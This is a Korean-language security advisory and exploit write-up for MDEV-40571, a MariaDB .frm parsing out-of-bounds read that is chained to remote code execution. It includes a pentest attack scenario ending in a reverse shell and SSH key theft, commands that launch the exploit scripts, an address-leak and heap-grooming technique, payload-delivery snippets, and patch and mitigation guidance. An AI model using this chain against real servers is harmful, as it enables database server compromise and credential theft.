
<p align="center">
  <a href="./README.md"><img src="https://img.shields.io/badge/lang-English-blue.svg" alt="English"></a>
  <a href="./README.ko.md"><img src="https://img.shields.io/badge/lang-한국어-red.svg" alt="한국어"></a>
</p>

# MDEV-40571
- [취약점 설명](#취약점-설명)
- [영향받는 제품](#영향받는-제품)
- [취약점 유형](#취약점-유형)
- [공격 시나리오](#공격-시나리오)
    * [Phase1 - API 분석 및 XSS를 통한 크레덴셜 확보](#phase1---api-분석-및-xss를-통한-크레덴셜-확보)
    * [Phase2 - 웹 서비스 상세 분석 및 SQLI를 통한 DBMS 계정 확보](#phase2---웹-서비스-상세-분석-및-sqli를-통한-dbms-계정-확보)
    * [Phase3 - MDEV-40571 취약점을 통한 리버스 쉘 확보 및 SSH 개인 키 획득](#phase3---mdev-40571-취약점을-통한-리버스-쉘-확보-및-ssh-개인-키-획득)
- [공격 시나리오 흐름도](#공격-시나리오-흐름도)
- [Exploit](#exploit)
    * [디렉토리 구조](#디렉토리-구조)
    * [Exploit 사용 예시](#exploit-사용-예시)
    * [데모 영상](#데모-영상)
    * [취약점 발단](#취약점-발단)
    * [RCE 체인 전제 조건](#rce-체인-전제-조건)
    * [취약점 상세 분석 및 풀체인 구성](#취약점-상세-분석-및-풀체인-구성)
- [패치 및 완화](#패치-및-완화)
- [결론](#결론)
- [Credits](#credits)

## 취약점 설명
MariaDB가 테이블을 여는 과정에서 .frm 데이터를 처리할 때 유효성 검증이 충분히 수행되지 않는 문제에서 시작됩니다. share->field 포인터 배열의 인덱스에 대한 검증 부재로 발생하는 OOB Read, default_values 및 레코드 메타데이터 조작을 통한 comment_pos 버퍼 주소 유출, 그리고 SQL 쿼리를 이용한 comment_pos 버퍼 내 페이로드 삽입을 연계하여 전체 익스플로잇 체인을 구성할 수 있습니다. 최종적으로 공격자는 이 체인을 통해 mariadbd 프로세스 권한으로 임의 코드를 실행할 수 있습니다.

## 영향받는 제품
MariaDB의 MySQL 5 포크 시점부터 존재하던 취약점이며 MariaDB/Server(Community Server)의 전체 릴리즈에 영향을 미칩니다.
- MariaDB 13.1 Series (Preview)
- MariaDB 13.0 Series (Preview)
- MariaDB 12.3.1 to 12.3.2
- MariaDB 11.8.1 to 11.8.8
- MariaDB 11.4.1 to 11.4.12
- MariaDB 10.11.1 to 10.11.18
- MariaDB 10.6.1 to 10.6.27
- Old MySQL Version(to 5.1) and Old MariaDB Community Server Release

## 취약점 유형
- OOB Read
- Remote Code Execution

## 공격 시나리오
본 공격 시나리오는 MDEV-40571 취약점과 관련 없는 일반적인 웹 서비스에서 존재할 수 있는 XSS, SQLI 를 통해 MariaDB 계정의 패스워드 해시를 획득하고 접근하는 단계부터 수행되므로 관심 없으신 분들은 [Exploit](#exploit) 탭을 보시길 바랍니다.

### Phase1 - API 분석 및 XSS를 통한 크레덴셜 확보
1. 공격자는 장비 펌웨어 분석을 통해 하드 코딩된 API 키와 API 파라미터에 대한 정보를 수집한다.
2. 공격자는 로깅용 API를 통해 XSS 페이로드를 구성하고 웹 기능을 수집한다.(HttpOnly 플래그로 인한 fetch만 가능한 상태)
3. 공격자는 수집한 웹 기능 중 계정 생성 기능을 발견 하였고 POST 파라미터를 수집하여 웹 ADMIN 계정을 생성, 크레덴셜을 획득한다.

### Phase2 - 웹 서비스 상세 분석 및 SQLI를 통한 DBMS 계정 확보
1. 공격자는 엑셀 다운로드 기능에서 SQLI 취약점을 확인, sqlmap을 통한 dbms 계정 확보를 시도한다.
2. DBMS 계정명과 패스워드 해시를 확인하였고, 확인 결과 패스워드 해시가 salt 되지않은 것을 확인했고 사전 대입을 통해 비밀번호를 획득한다.

### Phase3 - MDEV-40571 취약점을 통한 리버스 쉘 확보 및 SSH 개인 키 획득
1. MDEV-40470 취약점을 사용하여 획득한 DBMS 계정에서 DBA로 권한 상승한다.
2. 익스플로잇 스크립트 수행
3. mariadbd 권한의 쉘 획득 -> copy-fail 취약점을 사용하여 권한 상승 -> /home/ubuntu/ 디렉토리 내 존재하는 id_rsa 확보

## 공격 시나리오 흐름도

<p align="left">
        <img src="assets/attack_flow.gif" style="max-width: 200%; height: auto;" />
</p>


## Exploit
- 13.1.0: LAB 환경에서 테스트할 수 있는 익스플로잇 스크립트
- 10.4.18: 침투 테스트 진행 시 사용했던 익스플로잇 스크립트
  - 로컬 환경에 대상 환경과 일치하는 mariadb 서버를 올리고 frm을 읽어 오기 때문에, 이 스크립트는 단순 참고용으로만 사용 부탁 드립니다.

### 디렉토리 구조
```
/exploit
  |--- /13.1.0
  |      |--- lab_exploit.py
  |      |--- requirements.txt
  |--- /10.4.18
  |      |--- na_frm_rce2_exploit.py
  |      |--- t16_e2e.py
  |      |--- target_reliable.py
```

### Exploit 사용 예시
```bash
# 10.4.18 remote test
# This exploit was developed during a penetration test and is tailored to my specific environment. It should therefore be used for reference purposes only.
$ THOST=127.0.0.1 USER=mariadb_user TPWD=1234 python3 target_reliable.py --fire 

# WSL2 Ubuntu 24.04 | Building a MariaDB 13.1.0 Test Environment
# When installed in the home directory, the build environment is set up under mariadb-13.1.0-git.
$ cd ~
$ ./build_mariadb_13_1_0.sh 

# Run mariadbd and initialize datadir
$ rm -rf ~/off131
$ mkdir -p ~/off131/data
$ ~/mariadb-13.1.0-git/inst/bin/mariadbd \
  --no-defaults \
  --datadir="$HOME/off131/data" \
  --socket="$HOME/off131/off.sock" \
  --port=3306 \
  --bind-address=127.0.0.1 \
  --skip-grant-tables \
  --secure-file-priv= \
  --local-infile=1 \
  --aria-log-dir-path="$HOME/off131/data" \
  --log-error="$HOME/off131/off.log" \
  --pid-file="$HOME/off131/off.pid"

# 13.1.0 lab exploit - The payload executes the /tmp/heal_t16.sh script.
$ python3 lab_exploit.py --fire
$ cat /tmp/frm_selfheal 
$ rm -rf /tmp/frm_selfheal 
```

### 데모 영상
https://github.com/user-attachments/assets/5d41164c-f8f1-46fc-959a-22e6e849d795



### 취약점 발단
A사의 침투테스트 진행 중 SQLI를 통해 mariadb의 DBMS 크레덴셜을 획득 한 뒤, 대상 서버에 SSH 개인키 파일이 존재하는 것을 확인 하였습니다. SSH 개인 키를 얻기 위해 SQL 쿼리 만을 가지고 여러 방법을 시도 해봤으나 서버는 AWS 이미지를 받아 구성 되어있었고 기본적인 하드닝이 되어 plugindir, 우분투 파일 시스템에 대한 권한 제한으로 인해 코드 실행 할 방법이 없었습니다. 고민하던 중 유일하게 mariadbd 권한으로 파일 시스템에 R/W가 가능한 위치가 datadir 이였고 MySQL 구버전 및 MariaDB는 테이블을 처리할 때 frm 바이너리에 테이블 구조를 보관하는 것을 알게 되었습니다. 이를 기반으로 SQL 쿼리만을 통해 frm을 제어 할 수 있다면 파서에서 잘못 처리하는 부분이 있지 않을까라는 가설을 새우고 취약점 연구를 시작하게 되었습니다.

### RCE 체인 전제 조건
secure_file_priv 플래그가 비어있어야하며, DB 계정에 FILE 권한이 필요합니다. DB 계정의 FILE 권한은 [MDEV-40470: GRANT PROXY with empty password incorrectly checks grantor's privileges](https://hackerone.com/reports/3876430) 취약점을 활용해 DBA 계정으로 권한 상승합니다.

### 취약점 상세 분석 및 풀체인 구성
```c++
// [!] 유효성 검사 불충분: 범위 제한 없음
if (!key_part->fieldnr) 
	goto err;    
field= key_part->field= share->field[key_part->fieldnr-1]; // 테이블의 필드(=컬럼) 오브젝트를 가져옴
key_part->type= field->key_type(); // 필드의 키 타입을 가져오기 위해 key_type() 멤버 함수를 호출 하는 부분을 코드 실행 트리거로 사용 가능
```
취약점 발단을 계기로 Address sanitizer 빌드를 적용하여 frm 바이너리를 퍼징 해본 결과 share->field 포인터 배열의 인덱스에 사용되는 key_part->fieldnr 부분에서 유효성 검사가 충분히 이루어지 않았고 이는 frm 파일 조작을 통해 fieldnr 값 변경이 가능하다면 OOB Read가 발생함을 알 수 있습니다. 이 지점에서 몇 가지 추가적인 의문이 생기는데 share->field 포인터 배열은 어느 시점에, 어떤 코드를 통해 힙 메모리를 할당받는지 확인할 필요가 있습니다. 또한 fieldnr 값을 변경했을 때 share->field를 통해 실제로 어떤 객체를 참조하게 되는지도 살펴봐야 합니다.

```c++
/mariadb-10.4.18/sql/table.cc:2025~2038
  if (!multi_alloc_root(&share->mem_root,
                        &share->field, (uint)(share->fields+1)*sizeof(Field*),
                        &share->intervals, (uint)interval_count*sizeof(TYPELIB),
                        &share->check_constraints, (uint) share->table_check_constraints * sizeof(Virtual_column_info*),
                        /*
                           This looks wrong: shouldn't it be (+2+interval_count)
                           instread of (+3) ?
                        */
                        &interval_array, (uint) (share->fields+interval_parts+ keys+3)*sizeof(char *),
                        &typelib_value_lengths, total_typelib_value_count * sizeof(uint *),
                        &names, (uint) (n_length+int_length),
                        &comment_pos, (uint) com_length,
                        &vcol_screen_pos, vcol_screen_length,
                        NullS))
```                        
mariadb는 multi_alloc_root() 함수를 통해 아레나로부터 받은 청크(&share->mem_root)로부터 frm에 정의된 테이블과 필드의 구조에 맞게 메모리를 범프 할당합니다. 즉, init_from_binary_frm_image() 를 수행하는 함수의 &share->mem_root 청크는 alloc_root(), multi_alloc_root()에 의해 순차 할당 되는 것을 알 수 있습니다. 또한 &share->field는 테이블 내 존재하는 필드(=컬럼)의 개수에 따라서 필드 오브젝트의 포인터 주소를 보관하고 있는 포인터 배열임을 알 수 있습니다. 즉, share->field 포인터 배열이 frm 파일 조작을 통해 fieldnr 값이 변경이 가능하다면 comment_pos 버퍼를 참조 가능 하며 comment_pos 버퍼의 크기 조절과 페이로드 삽입은 테이블 정의 및 SQL 쿼리(DUMPFILE, OUTFILE)로 frm 파일을 조작하여 쉽게 제어할 수 있습니다.

```x86asm
field->key_type() disassmeble
-------------------------------------------------------------------------------------------
72440A:  mov    0x188(%r14),%rdx       ; rdx = share->field       ← r14=share, +0x188
724411:  mov    -0x8(%rdx,%rax,8),%r12 ; ★ r12 = share->field[fieldnr-1]  = *(field_base + fieldnr*8 - 8)
724416:  mov    %r12,0x0(%r13)         ; 2708: key_part->field = field
72441A:  mov    (%r12),%rax            ; rax = *(field) = vtable
72441E:  mov    %r12,%rdi              ; rdi = field (this)
724421:  call   *0x168(%rax)           ; 2709: field->key_type()   ★ vcall
```
하지만 가상 함수 호출(field->key_type())은 레지스터에 오브젝트의 주소를 명시해야하며 이는 곧 comment_pos 버퍼 주소의 유출이 필요함을 알 수 있습니다.

```sql
CREATE TABLE `t16` (
  `id` int(11) NOT NULL,
  `AAAAAAAA` int(11) DEFAULT NULL COMMENT 'QQQQ...(900)',   -- When a `COMMENT` is defined, the `LEX_CSTRING comment` member of the `Field` class is initialized, and the address of the `comment_pos` buffer is stored in `comment.str`.
  `ldf` char(16) CHARACTER SET latin1 DEFAULT 'AB',			-- To read the address of `C (comment_pos)`, the character set is set to `latin1`, and the field length is configured to 16 bytes.
  `e` enum('xxxxxxxx','xxxxyyyy') NOT NULL,
  `v` int(11) GENERATED ALWAYS AS (`id` + 1) VIRTUAL,
  PRIMARY KEY (`id`),
  KEY `k2` (`AAAAAAAA`)
) ENGINE=Aria ...
```
t16 테이블은 frm 변조를 기반으로 코드 실행과 comment_pos 주소 유출이 가능하도록 설계되었습니다. 위와 같은 테이블 구조를 사용함으로써 페이로드를 삽입할 수 있는 충분한 버퍼 크기를 확보하고, fieldnr 조작 시 share->field 포인터 배열에 대한 OOB Read가 comment_pos 버퍼를 참조하도록 인덱스 위치를 고정할 수 있습니다. 또한 대상 필드의 문자 집합을 latin1으로 지정하여 raw bytes 값의 변환을 최소화함으로써 comment_pos 버퍼 주소를 안정적으로 유출할 수 있도록 구성했습니다.

```text
&share->mem_root  (TABLE_ALLOC_BLOCK_SIZE = 4096 byte)
┌─────────────────────────────────────────────────────────────────┐
│ USED_MEM header                                                 │
├─────────────────────────────────────────────────────────────────┤
│ [key allocs: KEY, KEY_PART_INFO, rec_per_key ...]               │
├──────────────────────────────────────────── ↑ bump pointer      │
│ default_values  (32B)                       │ alloc_root()      | <-- [!] Manipulating `frm` files to control `rec_pos` and `field_length`: OOB read possible at the `comment.str` address
├──────────────────────────────────────────── │                   │
│ [multi_alloc_root]                          │                   |
│  ├─ share->field[]    ← Field* array        │                   |
│  ├─ share->intervals                        │                   │
│  ├─ interval_array                          │                   │
│  ├─ tvl                                     │                   │
│  ├─ names                                   │                   │
│  ├─ comment_pos ← "Q..." will be set payload│                   │
│  └─ vcol_screen                             │                   │
├──────────────────────────────────────────── │                   │
│ Field_long(Field*) object [id]              │ alloc_root()      │  i=0
│  vtable│ptr│null_ptr│table│field_name│...   │ via operator new  │
├──────────────────────────────────────────── │                   │
│ Field_long(Field*) object [AAAAAAAA]        │ alloc_root()      │  i=1 (defalue_values + 0x171)
│  vtable│ptr│null_ptr│table│comment.str      │ via operator new  │  // [leak target] comment.str = comment_pos
├──────────────────────────────────────────── │                   │
│ Field_string(Field*) object [ldf]           │ alloc_root()      │  i=2
│  vtable│ptr(=dv+0)│field_length(=N)│...     │ via operator new  │
├──────────────────────────────────────────── │                   │
│ Field_enum object [e]                       │ alloc_root()      │  i=3
├──────────────────────────────────────────── │                   │
│ Field_long object [v]                       │ alloc_root()      │  i=4
├──────────────────────────────────────────── ↓                   │
│                     (remain ~2700B)                             │
└─────────────────────────────────────────────────────────────────┘
```
테이블을 설계 한 뒤, init_from_binary_frm_image() 코드 분석을 통해 &share->mem_root 레이아웃을 재구성하였고 재구성한 이미지는 위와 같습니다. 여기서 우리는 필드(=컬럼)의 기본 값을 저장하는 default_values 버퍼에 관심을 두었고, 아래와 같은 가설을 세웠습니다.

- frm 에서 필드에 대한 field_length 값을 조작하고 기본 값을 쿼리로 요청하게 된다면 메모리 레이아웃상 comment.str 멤버 변수를 통해 comment_pos 버퍼주소를 획득할 수 있는거 아닌가?

가설을 증명하기 위해 ldf 필드의 field_length를 512(13.1.0은 1024)로 변경하였고, 디버깅 결과 10.4.18 빌드에서는 default_values 버퍼의 주소 기준으로 0x171 위치에 존재 하는 것을 확인할 수 있었습니다.

```text
[!] MariaDB는 열었던 테이블에 대해 TABLE_SHARE(&share)를 캐시에 보관합니다. 
```
하지만 위와 같은 문제가 발생하였고 아래 방법을 사용하여 문제를 해결 하였습니다.

1. DROP 쿼리를 사용해 이전에 존재하던 t16 frm을 지웁니다.
2. DUMP FILE 쿼리를 사용해 조작된 frm을 datadir에 씁니다.
3. FLUSH TABLES 쿼리를 보내, 이전에 사용되었던 캐시를 플러쉬합니다.
4. SHOW CREATE TABLE 쿼리를 보내 테이블을 FULL OPEN 하며 이 쿼리를 수행 하므로써 조작된 FRM이 캐시에 로드됩니다.

```text
SELECT HEX(CONVERT(COLUMN_DEFAULT USING latin1)) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='p3' AND TABLE_NAME='t16' AND COLUMN_NAME='ldf';
```
위 쿼리를 사용하여 information_schema 로부터 t16 테이블의 구조/설정을 조회하게 되면 캐시에는 조작된 FRM이 로드되며 ldf 필드의 field_length는 512(13.1.0은 1024)로 조작되었고 조작된 필드 크기를 기준으로 기본 값을 읽어오기 때문에 최종적으로 default_values 버퍼 기준으로 512(13.1.0은 1024) 만큼 읽어오게 되어 목표하는 comment_pos 버퍼 주소가 노출됩니다. 노출된 comment_pos 버퍼에 frm 을 조작을 통해 COP용 가젯을 삽입하여 execve 체인을 구성 하는 부분은 일반적인 Oriented Programming 이므로 여기서는 다루지 않습니다. 

```text
[!] 유출했을 때의 comment_pos 버퍼 주소가 코드 실행 페이로드가 포함된 frm을 열었을 때, 아레나의 free-list 상태에 따라서 달라질 수 있다.
```
가젯을 구성 하는 것 보다 위 코드 블록에서 언급하는 문제가 발생하는데, 아래 방법을 사용하여 문제를 해결 할 수 있습니다.


```text
[>] 8 x CPU Core ( 테스트환경 = 2) = 16 이며 스레드는 STICKY 배정, 16 상한 초과 시 아레나를 공유합니다.
```
여기서 우리는 아레나를 안정 시키기 위해 위 공식에 따라 16개의 연결을 유지하였습니다. 아래 쿼리를 반복함으로써 아레나 슬롯이 IDLE로 유도 될 것으로 판단하였고
```python
holds = [tconn() for _ in range(16)]                 # Connection of 16 holders
for c in holds: cu.execute("SELECT REPEAT('x',64)")  # Each performs one call to `malloc` → occupies an arena slot, then enters IDLE
```
추가 안전 조치로 게이트(leak시 6회의 동일한 comment_pos 주소 노출이 조건)를 두어 comment_pos 주소가 안정적으로 같은 값을 받게 되면 동작하게끔 구성하였습니다.


```python
weapon=build_weapon(base,C,MB,LB,cmd,arm=True)
e = deliver(conn,weapon)
if e: print("[*] trigger raised (expected on execve): %r" %e)
time.sleep(2)
print("[*] fired. check /tmp/frm_pwned_t16 for proof.")
```
위의 모든 방식을 적용하여 풀체인을 구성 하였고, 마지막으로 fieldnr을 조작한 frm을 전달 -> OOB Read를 하게 되면 share->field는 페이로드가 포함된 comment_pos 버퍼를 가리키게되고 필드에서 호출하는 함수로 인해 코드 실행이 발생하게 됩니다 😎

## 패치 및 완화
패치된 릴리즈는 10.6.28, 10.11.19, 11.4.13, 11.8.9, 12.3.3, 13.0.2 버전이며 릴리즈 노트와 함께 아래 링크에서 다운로드 받을 수 있습니다.
- https://mariadb.com/docs/release-notes/community-server/10.6/10.6.28
- https://mariadb.com/docs/release-notes/community-server/10.11/10.11.19
- https://mariadb.com/docs/release-notes/community-server/11.8/11.8.9
- https://mariadb.com/docs/release-notes/community-server/12.3/12.3.3
- 완화 방법: 가장 쉬운 완화 방법으로는 secure_file_priv를 지정하여 SQL 쿼리로 시스템의 파일 R/W를 제한 하면 됩니다. 또는 계정별 FILE 권한을 제한, 외부에서 DBMS에를 접속하게 할 때는 접근 통제를 적용하세요.

## 결론
데모 영상과 공격 시나리오에서 확인했듯이, MDEV-40571 취약점은 DBMS 계정과 접속이 전제 조건이며 적절하지 않은 보안 설정(secure_file_priv="")과 계정 관리가 이루어지 않는다면 SQL 쿼리만을 통해 코드 실행이 가능합니다. 이 취약점은 MARIADB가 MYSQL 5 포크 당시부터 존재하던 취약점이므로 영향 받는 제품의 버전 범위가 넓습니다. 운영 환경에 mariadb community server를 사용한다면, 한 번 쯤은 이 기술 문서를 참고 해보시길 바랍니다 😉

## Credits
- [pinebudweiser](https://github.com/pinebudweiser)
- [Ph4nt0m](https://blog.ph4nt0m.xyz/ko/blog/)
